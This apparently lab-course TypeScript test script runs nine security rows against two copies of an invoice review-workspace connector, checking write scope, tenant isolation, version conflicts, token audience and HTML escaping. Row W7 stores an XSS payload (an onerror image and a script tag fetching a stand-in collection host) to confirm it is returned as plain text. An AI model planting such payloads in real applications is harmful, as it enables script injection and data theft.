// The workspace matrix (Lab 20b, Task 8, docs/workspace-matrix.md): every save that should fail, tried
// against both copies of the review workspace connector, each row as one person, the way an AI app
// sends it. It starts a TypeScript copy (8757) and a Python copy (8758) on the dev database.
//
//   npm run matrix:workspace      (the test signing key from .secrets, or one made for this run)
//
// The connectors write for real, so the matrix first keeps a copy of the review notes, and puts them
// back when it ends: your own notes in dev survive a run. Prints one line per row and
// "matrix:workspace: N rows passed, M failed". It never prints a connection string or a token.
import { spawn, type ChildProcess } from "node:child_process";
import { createPrivateKey, createPublicKey, generateKeyPairSync, randomUUID } from "node:crypto";
import { readFileSync } from "node:fs";
import pg from "pg";
import { calculateJwkThumbprint, SignJWT, type JWK } from "jose";
import { dbEnvironment } from "./lib/db.ts";

dbEnvironment(process.argv.slice(2));
for (const v of ["DATABASE_URL_LOADER", "DATABASE_URL_REVIEW_WRITER"])
  if (!process.env[v]) throw new Error(`${v} is not set: run npm run db:migrate, then npm run db:passwords (Lab 20b, Task 1)`);
const ISSUER = "http://127.0.0.1:8719/api/auth";
const URLS = { ts: "http://127.0.0.1:8757/mcp", py: "http://127.0.0.1:8758/mcp" } as const;
const AP = "http://127.0.0.1:8717/mcp";
const KEY = process.env.AP_TEST_SIGNING_KEY || generateKeyPairSync("ed25519").privateKey.export({ format: "der", type: "pkcs8" }).toString("base64url");
const results: { row: string; ok: boolean; got: string }[] = [];
const row = (name: string, ok: boolean, got: string) => results.push({ row: name, ok, got });

// --- Keep the notes as they are, and put them back at the end -------------------------------------
const COMPANIES = ["org_cedar", "org_brightline"];
const loader = new pg.Client({ connectionString: process.env.DATABASE_URL_LOADER });
await loader.connect();
async function asCompany<T>(tenant: string, work: () => Promise<T>): Promise<T> {
  await loader.query("BEGIN");
  try {
    await loader.query("SELECT set_config('app.tenant_id', $1, true)", [tenant]);
    const r = await work();
    await loader.query("COMMIT");
    return r;
  } catch (e) { await loader.query("ROLLBACK"); throw e; }
}
const kept = new Map<string, Record<string, unknown>[]>();
for (const t of COMPANIES) kept.set(t, await asCompany(t, async () => (await loader.query("SELECT * FROM review_notes WHERE tenant_id = $1", [t])).rows));
const notesOf = (t: string) => asCompany(t, async () => (await loader.query("SELECT invoice_number, version, saved_by, note FROM review_notes WHERE tenant_id = $1 ORDER BY 1", [t])).rows);
async function clear() { for (const t of COMPANIES) await asCompany(t, () => loader.query("DELETE FROM review_notes WHERE tenant_id = $1", [t])); }
async function restore() {
  await clear();
  for (const [t, rows] of kept) await asCompany(t, async () => {
    for (const r of rows) await loader.query(
      "INSERT INTO review_notes (tenant_id, invoice_number, note, status, version, saved_by, saved_by_name, saved_at) VALUES ($1,$2,$3,$4,$5,$6,$7,$8)",
      [r.tenant_id, r.invoice_number, r.note, r.status, r.version, r.saved_by, r.saved_by_name, r.saved_at]);
  });
}

// --- Both copies, with the test key trusted, as on your computer ----------------------------------
const children: ChildProcess[] = [];
const audit: Record<string, string[]> = { ts: [], py: [] };
process.on("exit", () => children.forEach((c) => c.kill()));
const env = { ...process.env, AP_ISSUER: ISSUER, REVIEW_ISSUER: ISSUER, AP_TRUST_TEST_ISSUER: "1", AP_TEST_SIGNING_KEY: KEY, REVIEW_AS_OF: "2027-03-30" };
const start = (lang: "ts" | "py", child: ChildProcess) => {
  children.push(child);
  child.stdout?.on("data", (b: Buffer) => audit[lang].push(...b.toString().split("\n").filter((l) => l.startsWith("{"))));
};
start("ts", spawn("node", ["src/node.ts", "8757"], { cwd: "servers/review-ts", env: { ...env, REVIEW_RESOURCE: URLS.ts }, stdio: ["ignore", "pipe", "ignore"] }));
start("py", spawn("uv", ["run", "--locked", "python", "-m", "brightline_ap.review_server", "8758"], { cwd: "py", env: { ...env, REVIEW_RESOURCE: URLS.py, PYTHONUNBUFFERED: "1" }, stdio: ["ignore", "pipe", "ignore"] }));

const people = {
  luis: { sub: "u_matrix_luis", name: "Luis Moreno", tenant: "org_cedar", scope: "review:read review:write" },
  priya: { sub: "u_matrix_priya", name: "Priya Shah", tenant: "org_cedar", scope: "review:read review:write" },
  marco: { sub: "u_matrix_marco", name: "Marco Diaz", tenant: "org_cedar", scope: "review:read" },
  ana: { sub: "u_matrix_ana", name: "Ana Morales", tenant: "org_brightline", scope: "review:read review:write" },
};
async function token(who: keyof typeof people, aud: string) {
  const p = people[who];
  const privateKey = createPrivateKey({ key: Buffer.from(KEY, "base64url"), format: "der", type: "pkcs8" });
  const { kty, crv, x } = createPublicKey(privateKey).export({ format: "jwk" });
  return new SignJWT({ client_id: "app_matrix", azp: "app_matrix", scope: p.scope, tenant: p.tenant, name: p.name })
    .setProtectedHeader({ alg: "EdDSA", typ: "at+jwt", kid: await calculateJwkThumbprint({ kty, crv, x } as JWK) })
    .setIssuer(ISSUER).setAudience(aud).setSubject(p.sub).setIssuedAt().setExpirationTime("10m").setJti(randomUUID()).sign(privateKey);
}
type Answer = { status: number; text: string; sc?: any; isError: boolean; challenge: string };
async function rpc(url: string, tok: string, method: string, params: Record<string, unknown>, name = ""): Promise<Answer> {
  const body = JSON.stringify({ jsonrpc: "2.0", id: 1, method, params: { ...params,
    _meta: { "io.modelcontextprotocol/protocolVersion": "2026-07-28", "io.modelcontextprotocol/clientCapabilities": {} } } });
  for (let attempt = 0; ; attempt++) {
    try {
      const res = await fetch(url, { method: "POST", body, headers: { "content-type": "application/json", accept: "application/json, text/event-stream",
        "mcp-protocol-version": "2026-07-28", "mcp-method": method, ...(name ? { "mcp-name": name } : {}), authorization: `Bearer ${tok}` } });
      const raw = await res.text();
      const json = raw.startsWith("{") ? JSON.parse(raw) : raw.includes("data: ") ? JSON.parse(raw.split("\n").find((l) => l.startsWith("data: "))!.slice(6)) : {};
      return { status: res.status, text: json.result?.content?.[0]?.text ?? "", sc: json.result?.structuredContent ?? json.result,
        isError: json.result?.isError === true, challenge: res.headers.get("www-authenticate") ?? "" };
    } catch (e) {
      if (attempt > 120) throw e;
      await new Promise((r) => setTimeout(r, 250));
    }
  }
}
const call = (url: string, tok: string, name: string, args: Record<string, unknown>) => rpc(url, tok, "tools/call", { name, arguments: args }, name);
const PAGE = readFileSync("ui/review-workspace.html", "utf8");

for (const lang of ["ts", "py"] as const) {
  const url = URLS[lang];
  const t = { luis: await token("luis", url), priya: await token("priya", url), marco: await token("marco", url), ana: await token("ana", url) };
  await clear();
  // W1. Luis saves a note on INV-6201: version 1, and the copy's audit line names him.
  audit[lang].length = 0;
  const w1 = await call(url, t.luis, "save_review_note", { invoice_number: "INV-6201", note: "Matches PO-6101. Ready for the payment run.", status: "reviewed", version: 0 });
  await new Promise((r) => setTimeout(r, 300));
  const line = audit[lang].map((l) => JSON.parse(l)).find((l) => l.tool === "save_review_note");
  row(`W1 ${lang} Luis saves a note on INV-6201`, !w1.isError && w1.sc?.version === 1 && line?.person === "u_matrix_luis" && line?.outcome === "ok",
    `${w1.text.slice(0, 60)} | audit: ${line ? `${line.person} ${line.tool} ${line.outcome}` : "none"}`);
  // W2. Marco, an auditor, presses Save: 403 before the tool runs, nothing written.
  const before2 = (await notesOf("org_cedar")).length;
  const w2 = await call(url, t.marco, "save_review_note", { invoice_number: "INV-6202", note: "Marco tries to save.", status: "open", version: 0 });
  row(`W2 ${lang} Marco (auditor) presses Save`, w2.status === 403 && /insufficient_scope/.test(w2.challenge) && /review:write/.test(w2.challenge) && (await notesOf("org_cedar")).length === before2,
    `${w2.status}, ${w2.challenge.match(/error_description="([^"]*)"/)?.[1] ?? ""}`);
  // W3. Priya, for Cedar Ridge, saves a note on Brightline's INV-8301: not found.
  const w3 = await call(url, t.priya, "save_review_note", { invoice_number: "INV-8301", note: "x", status: "open", version: 0 });
  row(`W3 ${lang} Priya, for Cedar Ridge, saves on INV-8301`, w3.isError && /not found/.test(w3.text), w3.text);
  // W4. Luis, then Priya, save the same version: the second is refused, and names Luis and the time.
  await call(url, t.luis, "save_review_note", { invoice_number: "INV-6207", note: "Waiting on the vendor's credit note.", status: "follow up", version: 0 });
  const w4 = await call(url, t.priya, "save_review_note", { invoice_number: "INV-6207", note: "Paid, close it.", status: "reviewed", version: 0 });
  row(`W4 ${lang} Luis, then Priya, save version 0 of INV-6207`, w4.isError && /Luis Moreno saved version 1 at \d{4}-\d{2}-\d{2} \d{2}:\d{2} UTC/.test(w4.text), w4.text.slice(0, 90));
  // W5. Claude drafts through the page's draft_note: no copy offers it, and it calls no server tool.
  const listed = (await rpc(url, t.luis, "tools/list", {})).sc?.tools?.map((x: { name: string }) => x.name) ?? [];
  const draft = PAGE.slice(PAGE.indexOf('app.registerTool("draft_note"'), PAGE.indexOf("app.ontoolresult"));
  const rows5 = (await notesOf("org_cedar")).length;
  row(`W5 ${lang} Claude drafts through draft_note`, draft.length > 0 && !/callServerTool/.test(draft) &&
      !listed.some((n: string) => ["draft_note", "select_invoice", "filter_list"].includes(n)) && listed.length === 5 && (await notesOf("org_cedar")).length === rows5,
    `${listed.length} server tools, none of them the page's; draft_note calls no server tool; ${rows5} notes before and after`);
  // W6. Luis, from a script with no AI app, calls the page-only tool: checked like any call, and saved.
  const w6 = await call(url, t.luis, "save_review_note", { invoice_number: "INV-6202", note: "From a script, as Luis.", status: "open", version: 0 });
  row(`W6 ${lang} Luis calls save_review_note from a script`, !w6.isError && w6.sc?.version === 1, w6.text.slice(0, 70));
  // W7. Luis saves a note that holds page code: it comes back as the same characters, and the page writes text only.
  const planted = 'Check <img src=x onerror="alert(1)"> and <script>fetch("https://collect.example.net")</script>';
  await call(url, t.luis, "save_review_note", { invoice_number: "INV-6211", note: planted, status: "open", version: 0 });
  const w7 = await call(url, t.luis, "get_review_note", { invoice_number: "INV-6211" });
  const script = PAGE.slice(PAGE.indexOf("const { App"));
  row(`W7 ${lang} Luis saves a note that holds page code`, w7.sc?.note?.note === planted && !/innerHTML|outerHTML|insertAdjacentHTML|document\.write/.test(script),
    "the same characters back; the page writes values with textContent and value only");
  // W8. Ana, for Brightline, lists the review: none of Cedar Ridge's notes.
  const w8 = await call(url, t.ana, "review_list", {});
  const anaRows = (w8.sc?.invoices ?? []) as { invoice_number: string; saved_by_name: string | null }[];
  row(`W8 ${lang} Ana, for Brightline, calls review_list`, w8.sc?.count === 13 && anaRows.every((r) => r.saved_by_name === null),
    `${w8.sc?.count} of Brightline's open invoices, ${anaRows.filter((r) => r.saved_by_name).length} with a note`);
  // W9. Luis sends his AP connector token to the workspace: refused, because it was made for another address.
  const apToken = await token("luis", AP);
  const w9 = await rpc(url, apToken, "tools/list", {});
  row(`W9 ${lang} Luis sends his AP connector token`, w9.status === 401 && /Sign in to use the Brightline review workspace/.test(w9.challenge), `${w9.status}`);
}

// --- The report, then the notes as they were -------------------------------------------------------
await restore();
await loader.end();
for (const r of results) console.log(`${r.ok ? "pass" : "FAIL"}  ${r.row}  [${r.got}]`);
const failed = results.filter((r) => !r.ok).length;
console.log(`matrix:workspace: ${results.length - failed} rows passed, ${failed} failed`);
process.exit(failed ? 1 : 0);
